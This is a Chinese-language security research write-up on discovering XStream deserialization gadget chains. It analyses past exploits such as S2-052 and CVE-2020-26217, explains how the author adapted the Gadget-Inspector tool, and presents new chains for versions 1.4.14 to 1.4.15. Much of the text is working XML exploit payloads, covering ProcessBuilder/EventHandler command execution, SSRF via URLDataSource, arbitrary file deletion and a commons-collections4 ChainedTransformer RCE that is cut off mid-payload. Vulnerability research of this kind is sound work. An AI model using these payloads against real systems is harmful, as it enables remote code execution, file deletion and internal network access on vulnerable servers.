# XStream 1.4.14-14.15 Gadget挖掘过程分享

### 前言

关于这次XStream Gadget链的挖掘很大原因来源于2020年10月份某次项目中遇到了产品使用了1.4.11版本的XStream反序列化了外部可控的输入，但当时1.4.11没有CVE，没有可用的gadget去打RCE。只能作罢，没想到就过了一个月，爆出了1.4.13的RCE漏洞，顿时感觉错失一个严重问题。于是有了此次gadget的挖掘。

### XStream

#### 简介

XStream是java的第三方库，可以将对象序列化为xml或者将xml反序列化为java对象

#### Converter转换器

Convert转换器是XStream库的关键组件，它负责将对象转化为XML。

```java
    public Object start(DataHolder dataHolder) {
        this.dataHolder = dataHolder;
        Class type = HierarchicalStreams.readClassType(reader, mapper); //读取节点类型
        Object result = convertAnother(null, type);//根据类型找不同的Converter去转换。
        Iterator validations = validationList.iterator();
        while (validations.hasNext()) {
            Runnable runnable = (Runnable)validations.next();
            runnable.run();
        }
        return result;
    }
```

XStream默认的Converter可以在XStream.setupConverters中看到

```java
    protected void setupConverters() {
        registerConverter(
            new ReflectionConverter(mapper, reflectionProvider), PRIORITY_VERY_LOW);

        registerConverter(
            new SerializableConverter(mapper, reflectionProvider, classLoaderReference), PRIORITY_LOW);
        registerConverter(new ExternalizableConverter(mapper, classLoaderReference), PRIORITY_LOW);
        registerConverter(new InternalBlackList(), PRIORITY_LOW);

        registerConverter(new NullConverter(), PRIORITY_VERY_HIGH);
        registerConverter(new IntConverter(), PRIORITY_NORMAL);
        registerConverter(new FloatConverter(), PRIORITY_NORMAL);
        registerConverter(new DoubleConverter(), PRIORITY_NORMAL);
        registerConverter(new LongConverter(), PRIORITY_NORMAL);
        registerConverter(new ShortConverter(), PRIORITY_NORMAL);
        registerConverter((Converter)new CharConverter(), PRIORITY_NORMAL);
        registerConverter(new BooleanConverter(), PRIORITY_NORMAL);
        registerConverter(new ByteConverter(), PRIORITY_NORMAL);

        registerConverter(new StringConverter(), PRIORITY_NORMAL);
        registerConverter(new StringBufferConverter(), PRIORITY_NORMAL);
        registerConverter(new DateConverter(), PRIORITY_NORMAL);
        registerConverter(new BitSetConverter(), PRIORITY_NORMAL);
        registerConverter(new URIConverter(), PRIORITY_NORMAL);
        registerConverter(new URLConverter(), PRIORITY_NORMAL);
        registerConverter(new BigIntegerConverter(), PRIORITY_NORMAL);
        registerConverter(new BigDecimalConverter(), PRIORITY_NORMAL);

        registerConverter(new ArrayConverter(mapper), PRIORITY_NORMAL);
        registerConverter(new CharArrayConverter(), PRIORITY_NORMAL);
        registerConverter(new CollectionConverter(mapper), PRIORITY_NORMAL);
        registerConverter(new MapConverter(mapper), PRIORITY_NORMAL);
        registerConverter(new TreeMapConverter(mapper), PRIORITY_NORMAL);
        registerConverter(new TreeSetConverter(mapper), PRIORITY_NORMAL);
        registerConverter(new SingletonCollectionConverter(mapper), PRIORITY_NORMAL);
        registerConverter(new SingletonMapConverter(mapper), PRIORITY_NORMAL);
        registerConverter(new PropertiesConverter(), PRIORITY_NORMAL);
        registerConverter((Converter)new EncodedByteArrayConverter(), PRIORITY_NORMAL);

        registerConverter(new FileConverter(), PRIORITY_NORMAL);
        if (JVM.isSQLAvailable()) {
            registerConverter(new SqlTimestampConverter(), PRIORITY_NORMAL);
            registerConverter(new SqlTimeConverter(), PRIORITY_NORMAL);
            registerConverter(new SqlDateConverter(), PRIORITY_NORMAL);
        }
        registerConverter(new DynamicProxyConverter(mapper, classLoaderReference), PRIORITY_NORMAL);
        registerConverter(new JavaClassConverter(classLoaderReference), PRIORITY_NORMAL);
        registerConverter(new JavaMethodConverter(classLoaderReference), PRIORITY_NORMAL);
        registerConverter(new JavaFieldConverter(classLoaderReference), PRIORITY_NORMAL);
}
```

#### 历史版本POC浅析

##### sorted-set、TreeMap

**payload**

```xml
<tree-map>
    <entry>
        <dynamic-proxy>
            <interface>java.lang.Comparable</interface>
            <handler class="java.beans.EventHandler">
                <target class="java.lang.ProcessBuilder">
                    <command>
                        <string>calc.exe</string>
                    </command>
                </target>
                <action>start</action>
            </handler>
        </dynamic-proxy>
        <string>good</string>
    </entry>
</tree-map>
```

```xml

<sorted-set>
    <dynamic-proxy>
        <interface>java.lang.Comparable</interface>
        <handler class="java.beans.EventHandler">
            <target class="java.lang.ProcessBuilder">
                <command>
                    <string>calc.exe</string>
                </command>
            </target>
            <action>start</action>
        </handler>
    </dynamic-proxy>
</sorted-set>
```

调用栈：

```
start:1008, ProcessBuilder (java.lang)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
invoke:71, Trampoline (sun.reflect.misc)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
invoke:275, MethodUtil (sun.reflect.misc)
invokeInternal:482, EventHandler (java.beans)
access$000:279, EventHandler (java.beans)
run:430, EventHandler$1 (java.beans)
doPrivileged:-1, AccessController (java.security)
invoke:428, EventHandler (java.beans)
compareTo:-1, $Proxy0 (com.sun.proxy)
compare:1294, TreeMap (java.util)
put:538, TreeMap (java.util)
putAll:281, AbstractMap (java.util)
putAll:327, TreeMap (java.util)
populateTreeMap:122, TreeMapConverter (com.thoughtworks.xstream.converters.collections)
unmarshal:126, TreeSetConverter (com.thoughtworks.xstream.converters.collections)
convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)
convert:70, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)
convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)
convertAnother:50, TreeUnmarshaller (com.thoughtworks.xstream.core)
start:134, TreeUnmarshaller (com.thoughtworks.xstream.core)
unmarshal:32, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)
unmarshal:1486, XStream (com.thoughtworks.xstream)
unmarshal:1466, XStream (com.thoughtworks.xstream)
fromXML:1430, XStream (com.thoughtworks.xstream)
fromXML:1372, XStream (com.thoughtworks.xstream)
main:11, XStreamPoc (org.zlg)
```

###### **总结**

总的来说，就是通过在xml中构造treemap对象，并在其中包含实现了Comparable接口的Proxy类实例，实例中指定handler为EventHandler，在解析完对象后，put进treemap时，会调用key.compareTo方法，触发handler实现的invoke方法，又由于反射的方法和参数都是类的成员变量，参数可控。从而在invoke方法中会反射ProcessBuilder从而导致命令执行 。

###### **修复**

1.4.11之后的XStream增加了一个黑名单类，canConverter()方法中对EventHandler类、以”javax.crypto.”开头的类、以”$LazyIterator”结尾的类都进行了匹配，而其marshal()和unmarshal()方法都是直接抛出异常的，换句话说就是匹配成功的直接抛出异常即黑名单过滤：

![image-20201117174442916](XStream 1.4.14-14.15 Gadget挖掘过程分享.assets/image-20201117174442916.png)

##### Interface

基于接口的类型的payload和上面两个poc不一样，并不会立即触发。这种方式是基于服务端解析XML之后会直接调用到XML中interface标签指向的接口类声明的方法，因此这种情形下必然会触发动态代理类对象的恶意方法。

```xml
<contact class='dynamic-proxy'>
  <interface>org.company.model.Contact</interface>
  <handler class='java.beans.EventHandler'>
    <target class='java.lang.ProcessBuilder'>
      <command>
        <string>calc.exe</string>
      </command>
    </target>
    <action>start</action>
  </handler>
</contact>
```

##### S2-052

S2-052 payload如下:

```xml
<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <initialized>false</initialized>
                <opmode>0</opmode>
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <next class="java.lang.ProcessBuilder">
                      <command>
                        <string>calc</string>
                      </command>
                      <redirectErrorStream>false</redirectErrorStream>
                    </next>
                  </iter>
                  <filter class="javax.imageio.ImageIO$ContainsFilter">
                    <method>
                      <class>java.lang.ProcessBuilder</class>
                      <name>start</name>
                      <parameter-types/>
                    </method>
                    <name>foo</name>
                  </filter>
                  <next class="string">foo</next>
                </serviceIterator>
                <lock/>
              </cipher>
              <input class="java.lang.ProcessBuilder$NullInputStream"/>
              <ibuffer></ibuffer>
              <done>false</done>
              <ostart>0</ostart>
              <ofinish>0</ofinish>
              <closed>false</closed>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
  </entry>
  <entry>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
  </entry>
</map>
```

###### 调试分析

下断点调试查看调用栈，直接将断点下在ProcessBuilder.start方法。

```
start:1007, ProcessBuilder (java.lang)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
filter:613, ImageIO$ContainsFilter (javax.imageio)
advance:834, FilterIterator (javax.imageio.spi)
next:852, FilterIterator (javax.imageio.spi)
chooseFirstProvider:749, Cipher (javax.crypto)
update:1831, Cipher (javax.crypto)
getMoreData:139, CipherInputStream (javax.crypto)
read:246, CipherInputStream (javax.crypto)
readFrom:65, ByteArrayOutputStreamEx (com.sun.xml.internal.bind.v2.util)
get:182, Base64Data (com.sun.xml.internal.bind.v2.runtime.unmarshaller)
toString:286, Base64Data (com.sun.xml.internal.bind.v2.runtime.unmarshaller)
getStringValue:121, NativeString (jdk.nashorn.internal.objects)
hashCode:117, NativeString (jdk.nashorn.internal.objects)
hash:339, HashMap (java.util)
put:612, HashMap (java.util)
putCurrentEntryIntoMap:113, MapConverter (com.thoughtworks.xstream.converters.collections)
populateMap:98, MapConverter (com.thoughtworks.xstream.converters.collections)
populateMap:92, MapConverter (com.thoughtworks.xstream.converters.collections)
unmarshal:87, MapConverter (com.thoughtworks.xstream.converters.collections)
convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)
convert:65, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)
convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)
convertAnother:50, TreeUnmarshaller (com.thoughtworks.xstream.core)
start:134, TreeUnmarshaller (com.thoughtworks.xstream.core)
unmarshal:32, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)
unmarshal:1157, XStream (com.thoughtworks.xstream)
unmarshal:1141, XStream (com.thoughtworks.xstream)
fromXML:1105, XStream (com.thoughtworks.xstream)
fromXML:1047, XStream (com.thoughtworks.xstream)
main:9, XStreamPoc (org.zlg)
```

从这个调用栈可以看出来，漏洞的触发入口和TreeMap、sorted-set有点类似。TreeMap漏洞的触发在comparable接口，XStream在反序列化完map中的entry之后会将entry put进TreeMap中，TreeMap中put方法调用comparable接口的方法，从而触发动态代理的执行。

ImageIO这个调用链会复杂很多，但漏洞的入口在于也是反序列化完entry之后，会将entry put进hashmap中，然后put方法中会调用hash方法

![image-20201118115705536](XStream 1.4.14-14.15 Gadget挖掘过程分享.assets/image-20201118115705536.png)

而hash方法中会调用key.hashcode方法，

![image-20201118145408614](XStream 1.4.14-14.15 Gadget挖掘过程分享.assets/image-20201118145408614.png)

最后层层调用到Base64Data.get方法。

![image-20201118145639131](XStream 1.4.14-14.15 Gadget挖掘过程分享.assets/image-20201118145639131.png)

然后是javax.crypto.CipherInputStream的read方法，最后到ImageIO$ContainsFilter的filter方法，触发反射执行

![image-20201118150229664](XStream 1.4.14-14.15 Gadget挖掘过程分享.assets/image-20201118150229664.png)

###### 修复

1.4.10之后的版本都无法使用这个POC，只禁了javax.crypto，也就是说只禁了中间一环没有把入口跟漏洞出发点ImageIO禁掉。这就导致了CVE-2020-26217。

![image-20201117174442916](XStream 1.4.14-14.15 Gadget挖掘过程分享.assets/image-20201117174442916-1610963057085.png)

##### CVE-2020-26217

是S2-052的变种，payload如下：

```xml
<map>
    <entry>
        <jdk.nashorn.internal.objects.NativeString>
            <flags>0</flags>
            <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>
                <dataHandler>
                    <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>
                        <contentType>text/plain</contentType>
                        <is class='java.io.SequenceInputStream'>
                            <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>
                                <iterator class='javax.imageio.spi.FilterIterator'>
                                    <iter class='java.util.ArrayList$Itr'>
                                        <cursor>0</cursor>
                                        <lastRet>-1</lastRet>
                                        <expectedModCount>1</expectedModCount>
                                        <outer-class>
                                            <java.lang.ProcessBuilder>
                                                <command>
                                                    <string>calc</string>
                                                </command>
                                            </java.lang.ProcessBuilder>
                                        </outer-class>
                                    </iter>
                                    <filter class='javax.imageio.ImageIO$ContainsFilter'>
                                        <method>
                                            <class>java.lang.ProcessBuilder</class>
                                            <name>start</name>
                                            <parameter-types/>
                                        </method>
                                        <name>start</name>
                                    </filter>
                                    <next/>
                                </iterator>
                                <type>KEYS</type>
                            </e>
                            <in class='java.io.ByteArrayInputStream'>
                                <buf></buf>
                                <pos>0</pos>
                                <mark>0</mark>
                                <count>0</count>
                            </in>
                        </is>
                        <consumed>false</consumed>
                    </dataSource>
                    <transferFlavors/>
                </dataHandler>
                <dataLen>0</dataLen>
            </value>
        </jdk.nashorn.internal.objects.NativeString>
        <string>test</string>
    </entry>
</map>
```

###### 修复

将ImageIO$ContainsFilter和ProcessBuilder加入了黑名单。

![image-20201118153340650](XStream 1.4.14-14.15 Gadget挖掘过程分享.assets/image-20201118153340650.png)

#### 危险特性

1、反序列化功能强大，无需实现Serializable接口，无需实现setter/getter函数，可反序列化除了抽象类和静态成员之外的大部分类的实例及其成员变量。

2、java语言特征，和java泛型类有关。叫类型擦除。利用这个特性加上成员可随意实例化会变的非常危险。

例如下面一段代码,很明显，编译器编译时就会报错

```java
    public static void main(String args[]) throws  Exception{
        Context ctx = new InitialContext();
        Enumeration<URL> enu1 = new ContextEnumerator(ctx);
    }
```

但是如果你实现这么一个类

```java
package org.zlg;

import java.net.URL;
import java.util.Enumeration;

public class GenericsTest {
    private Enumeration<URL> enu1;
}

```

然后xml内容如下：

```xml
<org.zlg.GenericsTest>
    <enu1 class="com.sun.jndi.toolkit.dir.ContextEnumerator"/>
</org.zlg.GenericsTest>

```

运行如下代码,发现运行会通过。

```java
    public static void main(String args[]) throws  Exception{
        XStream xStream = new XStream();
        GenericsTest genericsTest = (GenericsTest) xStream.fromXML(new File("GenericsTest.xml"));
    }
```

实际上，在运行时jvm看到的字节码可能是和下面这种效果一样

```java
Enumeration<Object> enu1 = new ContextEnumerator(ctx)
```

### Gadget-Inspector

#### 简介

一个外国研究团队在2018年black hat大会上提出了Gadget-Inspector这个反序列化Gadget挖掘工具，Gadget-Inspector基于字节码静态分析，利用已知技巧自动查找从source到sink的反序列化利用链。

**source**

source是在反序列化过程中一定会被调用的方法，如java反序列化时的几个魔术方法：

- Object.readObject
- Object.readResolve
- Object.finalize

一些可反序列化的JDK类实现了上面方法还自动调用了其他方法，如：

HashMap：

key.hashcode Object.equals()

PriorityQueue 

Comparator.compare()

Comparable.CompareTo()



**sink**

Runtime.exec()、ProcessBuilder.start等等

#### 工作流程

1.枚举所有类以及每个类的所有方法，同时生成继承关系。

Gadget-inspector使用了java 字节码操作框架 asm来解析类中的所有元素：类名称、方法、属性以及 Java 字节码（指令）。

```java
public class MethodDiscovery {

private static final Logger LOGGER = LoggerFactory.getLogger(MethodDiscovery.class);

private final List<ClassReference> discoveredClasses = new ArrayList<>();//保存所有类信息
private final List<MethodReference> discoveredMethods = new ArrayList<>();//保存所有方法信息
    ...
    ...
public void discover(final ClassResourceEnumerator classResourceEnumerator) throws Exception {
//classResourceEnumerator.getAllClasses()获取了运行时的所有类(JDK rt.jar)以及要搜索应用中的所有类
for (ClassResourceEnumerator.ClassResource classResource : classResourceEnumerator.getAllClasses()) {
try (InputStream in = classResource.getInputStream()) {
                ClassReader cr = new ClassReader(in);
try {
                    cr.accept(new MethodDiscoveryClassVisitor(), ClassReader.EXPAND_FRAMES);//通过ASM框架操作字节码并将类信息保存到this.discoveredClasses，将方法信息保存到discoveredMethods
                } catch (Exception e) {
                    LOGGER.error("Exception analyzing: " + classResource.getName(), e);
                }
            }
        }
    }
    ...
    ...
public void save() throws IOException {
        DataLoader.saveData(Paths.get("classes.dat"), new ClassReference.Factory(), discoveredClasses);//将类信息保存到classes.dat
        DataLoader.saveData(Paths.get("methods.dat"), new MethodReference.Factory(), discoveredMethods);//将方法信息保存到methods.dat

        Map<ClassReference.Handle, ClassReference> classMap = new HashMap<>();
for (ClassReference clazz : discoveredClasses) {
            classMap.put(clazz.getHandle(), clazz);
        }
        InheritanceDeriver.derive(classMap).save();//查找所有继承关系并保存
    }
}
```

解析完后会生成三个文件，以ByteArratDataSource举例

```java
public final class ByteArrayDataSource implements DataSource {
    private final String contentType;
    private final byte[] buf;
    private final int len;

    public ByteArrayDataSource(byte[] buf, String contentType) {
        this(buf, buf.length, contentType);
    }

    public ByteArrayDataSource(byte[] buf, int length, String contentType) {
        this.buf = buf;
        this.len = length;
        this.contentType = contentType;
    }

    public String getContentType() {
        return this.contentType == null ? "application/octet-stream" : this.contentType;
    }

    public InputStream getInputStream() {
        return new ByteArrayInputStream(this.buf, 0, this.len);
    }

    public String getName() {
        return null;
    }

    public OutputStream getOutputStream() {
        throw new UnsupportedOperationException();
    }
}
```

class.dat 数据格式

| 类名                                        | 父类名           | 接口                        | 是否是接口 | 成员                                               |
| ------------------------------------------- | ---------------- | --------------------------- | ---------- | -------------------------------------------------- |
| com/sun/istack/internal/ByteArrayDataSource | java/lang/Object | javax/activation/DataSource | false      | contentType!18!java/lang/String!buf!18![B!len!18!I |

method.dat数据格式

| 类名                                        | 方法名  | 参数类型与返回类型      | 是否是静态方法 |
| ------------------------------------------- | ------- | ----------------------- | -------------- |
| com/sun/istack/internal/ByteArrayDataSource | \<init> | ([BLjava/lang/String;)V | false          |

inheritanceMap.dat数据格式

| 类名                                             | 父类                                            |
| ------------------------------------------------ | ----------------------------------------------- |
| com/sun/xml/internal/ws/util/ByteArrayDataSource | java/lang/Object	javax/activation/DataSource |

2，生成方法与返回值的污染关系。

这里以作者PPT中给的Demo为例子，返回值与this有关，标记为0参，与函数参数有关，标记为1参。

![image-20201206181123029](XStream 1.4.14-14.15 Gadget挖掘过程分享.assets/image-20201206181123029.png)

那么当函数调用复杂的时候，如何判断返回值与参数污染的关系

举个例子。

```java
pacakge com.test;
public class Test{
    public String main(String args) throws IOException {
        String cmd = new A().method1(args);
        new B().method2(cmd);
    }
}
class A {
  public String method1(String param) {
    return param;
  }
}
class B {
  public String method2(String param) throws IOException {
    return new C().method3(param);
  }
}
class C {
  public String method3(String param) throws IOException {
    return param;
  }
}
```

Gadget-inspector采用逆拓扑排序的方法进行分析，如上面例子中的调用链。

```
Test.main->A.method1
Test.main->B.method2->C.method3
```

实际分析顺序。

```
A.method1
C.method3->B.method2
```

为了实现类似污点分析，去分析参数对方法的污染，它模仿了jvm也实现了一个本地变量表，在分析函数方法时，会将this成员变量和函数入参加入本地变量表，在执行return动作时，如果返回值是来自本地变量表的引用时，就会判断存在参数污染。



生成的参数污染返回关系会保存在passthrough.dat文件中。

格式：

| 类名                                             | 方法名         | 入参类型与返回类型      | 污染关系 |
| ------------------------------------------------ | -------------- | ----------------------- | -------- |
| com/sun/xml/internal/ws/util/ByteArrayDataSource | getInputStream | ()Ljava/io/InputStream; | 0        |



3.生成调用与参数传递关系

这一步会生成函数的调用关系与参数传递。

```
Test@main (1) -> A@method1 (1)
```

生成的调用与参数传递关系会保存在callgraph.dat文件中

| 调用类                                      | 方法           | 入参与返回值            | 被调用类                     | 方法    | 调用类方法入参与返回值 | 调用类参数类型 | 参数对象的哪个field被传递 | 子方法参数类型 |
| ------------------------------------------- | -------------- | ----------------------- | ---------------------------- | ------- | ---------------------- | -------------- | ------------------------- | -------------- |
| com/sun/istack/internal/ByteArrayDataSource | getInputStream | ()Ljava/io/InputStream; | java/io/ByteArrayInputStream | \<init> | ([BII)V                | 0              | len                       | 3              |



4.搜索可用的source

搜索可用的source并保存在source.dat中。这里的source是由我们定制的，如果在代码中将HashMap.put作为source，那么会生成的结果如下

| 类名              | 方法名 | 方法描述                                                 |
| ----------------- | ------ | -------------------------------------------------------- |
| java/util/HashMap | put    | (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object; |



5.生成调用链。

根据第四步的source和第三步的函数调用关系，采用BFS的方式寻找从source到sink的调用链。

以hashmap.put为例：

![image-20210119103324724](XStream 1.4.14-14.15 Gadget挖掘过程分享.assets/image-20210119103324724.png)

#### 缺点

在使用gadget-inspector的过程中发现了几个问题比较致命

1、无法识别接口和多态关系。

```java
public interface GIConfig {
    void setName(String name);
}

public class Test{
    GIConfig config;
    public void setName(String name){
        config.setName(name);
	}
        
}
public Iconfig implements GIconfig{
    void setName(String name){
        Runtime.getRuntime.exec(name);
    }
}
```

后来发现先知的threedr3am师傅初步解决了这个问题，具体方法是当搜索链的时候会把接口的所有实现都加到同一层级的链中。但是只解决了接口问题。

2、生成的链不完整。

生成的链不完整的问题主要是因为在搜索生成链的时候会有一个已访问节点的判断，如果该节点已访问过那么将不会再次访问。

后来在知道创宇一位师傅的文章中看到了几点改进想法（https://paper.seebug.org/1034/#_13），最后采用了DFS+深度限制+剪枝+同时输出调用链的方法。

![image-20201207005128391](XStream 1.4.14-14.15 Gadget挖掘过程分享.assets/image-20201207005128391.png)

改进前：5分钟收敛结束后输出调用链。

改造后：十天十夜都无法收敛，但是会输出很多的调用链。

3、参数污染判断存在误报。

如以Object.toString作为source，会出现以下调用链

```
com/sun/jmx/snmp/agent/SnmpIndex.toString()Ljava/lang/String; (0)
  com/sun/jndi/toolkit/dir/ContextEnumerator.nextElement()Ljava/lang/Object; (0)
  com/sun/jndi/toolkit/dir/ContextEnumerator.nextElement()Ljavax/naming/Binding; (0)
  com/sun/jndi/toolkit/dir/ContextEnumerator.next()Ljavax/naming/Binding; (0)
  com/sun/jndi/toolkit/dir/ContextEnumerator.getNextDescendant()Ljavax/naming/Binding; (0)
  com/sun/jndi/toolkit/dir/ContextEnumerator.prepNextChild()V (0)
  com/sun/jndi/toolkit/dir/ContextEnumerator.newEnumerator(Ljavax/naming/Context;ILjava/lang/String;Z)Lcom/sun/jndi/toolkit/dir/ContextEnumerator; (1)
  com/sun/jndi/toolkit/dir/ContextEnumerator.<init>(Ljavax/naming/Context;ILjava/lang/String;Z)V (1)
  com/sun/jndi/toolkit/dir/ContextEnumerator.getImmediateChildren(Ljavax/naming/Context;)Ljavax/naming/NamingEnumeration; (1)
  com/sun/jndi/ldap/LdapReferralContext.listBindings(Ljava/lang/String;)Ljavax/naming/NamingEnumeration; (0)
  com/sun/jndi/ldap/LdapReferralContext.listBindings(Ljavax/naming/Name;)Ljavax/naming/NamingEnumeration; (0)
  com/sun/jndi/toolkit/url/GenericURLDirContext.search(Ljavax/naming/Name;Ljava/lang/String;Ljavax/naming/directory/SearchControls;)Ljavax/naming/NamingEnumeration; (0)
  com/sun/jndi/toolkit/url/GenericURLDirContext.getContinuationDirContext(Ljavax/naming/Name;)Ljavax/naming/directory/DirContext; (0)
  com/sun/jndi/toolkit/url/GenericURLContext.lookup(Ljava/lang/String;)Ljava/lang/Object; (0)
```

SnmpIndex.toString代码如下：

![image-20210119104858617](XStream 1.4.14-14.15 Gadget挖掘过程分享.assets/image-20210119104858617.png)

elements()函数如下，可以看到返回的枚举实例含有this参数，所以被认为参数可控，但是实际无法改变它的类型为ContextEnumerator。

![image-20210119104959316](XStream 1.4.14-14.15 Gadget挖掘过程分享.assets/image-20210119104959316.png)

解决方法：将SnmpIndex.toString加入黑名单。

#### 下载地址

https://github.com/JackOfMostTrades/gadgetinspector

https://github.com/threedr3am/gadgetinspector

### XStream 1.4.14

#### source定制

1.4.14对于CVE-2020-26217的修复措施是将ImageIO和ProcessBuilder加入黑名单，堵了利用的两个类，没有将入口堵住。所以将Base64Data.get作为source。

我们只需要在Gadget-inspector中实现三个组件，分别是

1. SerializableDecider：序列化决策者，这个决策者的作用主要围绕着apply方法的实现，通过apply方法，判断目标类class是否具备可序列化，那么相对而言就是是否可以被反序列化，像Java原生反序列化就需要class实现java/io/Serializable序列化接口才能反序列化。
2. ImplementationFinder：对于一个接口interface，该组件主要用于判断它的实现类，是否能被反序列化
3. SourceDiscovery：链的起始端搜索类，类似于jackson对于json的解析，在反序列化时，会有一定条件的触发setter、getter方法，那么，这些方法即是整个gadget chain的入口点，而该组件就是用于搜索所有具备这样特征的类

#### 发现的Gadget链

##### SSRF

只需定制好source之后就可以发现这一条链

```
com/sun/xml/internal/bind/v2/runtime/unmarshaller/Base64Data.get()[B (0)
  javax/activation/URLDataSource.getInputStream()Ljava/io/InputStream; (0)
  java/net/URL.openStream()Ljava/io/InputStream; (0)
```

poc

```xml
<map>
    <entry>
        <jdk.nashorn.internal.objects.NativeString>
            <flags>0</flags>
            <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>
                <dataHandler>
                    <dataSource class='javax.activation.URLDataSource'>
                        <url>http://localhost:9999/ssrf?a=1</url>
                    </dataSource>
                    <transferFlavors/>
                </dataHandler>
                <dataLen>0</dataLen>
            </value>
        </jdk.nashorn.internal.objects.NativeString>
        <string>test</string>
    </entry>
</map>
```

##### 任意文件删除

忘记保存结果了。

poc

```xml
<map>
    <entry>
        <jdk.nashorn.internal.objects.NativeString>
            <flags>0</flags>
            <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>
                <dataHandler>
                    <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>
                        <contentType>text/plain</contentType>
                        <is class='com.sun.xml.internal.ws.util.ReadAllStream$FileStream'>
                            <tempFile>D:\data\1.txt</tempFile>
                        </is>
                        <consumed>false</consumed>
                    </dataSource>
                    <transferFlavors/>
                </dataHandler>
                <dataLen>0</dataLen>
            </value>
        </jdk.nashorn.internal.objects.NativeString>
        <string>test</string>
    </entry>
</map>
```

##### RCE

基于commons-collections4。发现了如下调用链

```
com/sun/xml/internal/bind/v2/runtime/unmarshaller/Base64Data.get()[B (0)
  com/sun/xml/internal/ws/encoding/MIMEPartStreamingDataHandler$StreamingDataSource.getInputStream()Ljava/io/InputStream; (0)
  com/sun/xml/internal/org/jvnet/mimepull/MIMEPart.read()Ljava/io/InputStream; (0)
  com/sun/xml/internal/org/jvnet/mimepull/DataHead.read()Ljava/io/InputStream; (0)
  com/sun/xml/internal/org/jvnet/mimepull/MIMEMessage.makeProgress()Z (0)
  org/apache/commons/collections4/iterators/ObjectGraphIterator.hasNext()Z (0)
  org/apache/commons/collections4/iterators/ObjectGraphIterator.updateCurrentIterator()V (0)
  org/apache/commons/collections4/iterators/ObjectGraphIterator.findNextByIterator(Ljava/util/Iterator;)V (0)
  org/apache/commons/collections4/functors/InvokerTransformer.transform(Ljava/lang/Object;)Ljava/lang/Object; (0)
  java/lang/reflect/Method.invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object; (0)
```

这条链发现是一个熟悉的老面孔。在分析到ObjectGraphIterator.updateCurrentIterator方法时，发现没有必要走findNextByIterator分支。可以直接调用到transform函数。

![image-20210119114005449](XStream 1.4.14-14.15 Gadget挖掘过程分享.assets/image-20210119114005449.png)

当跟入到这里的时候，立马去看了一下transformer定义

![image-20210119114225281](XStream 1.4.14-14.15 Gadget挖掘过程分享.assets/image-20210119114225281.png)

这就意味着可以将它赋值为ChainTransFormer打循环反射RCE，payload如下：

```xml
<map>
    <entry>
        <jdk.nashorn.internal.objects.NativeString>
            <flags>0</flags>
            <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>
                <dataHandler>
                    <dataSource class='com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePartDataSource'>
                        <part>
                            <mimePart>
                                <dataHead>
                                    <part>
                                        <msg>
                                            <it class="org.apache.commons.collections4.iterators.ObjectGraphIterator">
                                                <stack class="java.util.ArrayDeque" serialization="custom">
                                                    <unserializable-parents/>
                                                    <java.util.ArrayDeque>
                                                        <default/>
                                                        <int>0</int>
                                                    </java.util.ArrayDeque>
                                                </stack>
                                                <root class="java.lang.String">
                                                    <it>
                                                        <outer-class reference="../.."/>
                                                    </it>
                                                </root>
                                                <transformer class="org.apache.commons.collections4.functors.ChainedTransformer">
                                                    <iTransformers>
                                                        <org.apache.commons.collections4.functors.ConstantTransformer>
                                                            <iConstant class="java-class">java.lang.Runtime</iConstant>
                                                        </org.apache.commons.collections4.functors.ConstantTransformer>
                                                        <org.apache.commons.collections4.functors.InvokerTransformer>
                                                            <iMethodName>getMethod</iMethodName>
                                                            <iParamTypes>
                                                                <java-class>java.lang.String</java-class>
                                                                <java-class>[Ljava.lang.Class;</java-class>
                                                            </iParamTypes>
                                                            <iArgs>
                                                                <string>getRuntime</string>
                                                                <java-class-array/>
                                                            </iArgs>
                                                        </org.apache.commons.collections4.functors.InvokerTransformer>
                                                        <org.apache.commons.collections4.functors.InvokerTransformer>
                                                            <iMethodName>invoke</iMethodName>
                                                            <iParamTypes>
                                                                <java-class>java.lang.Object</java-class>
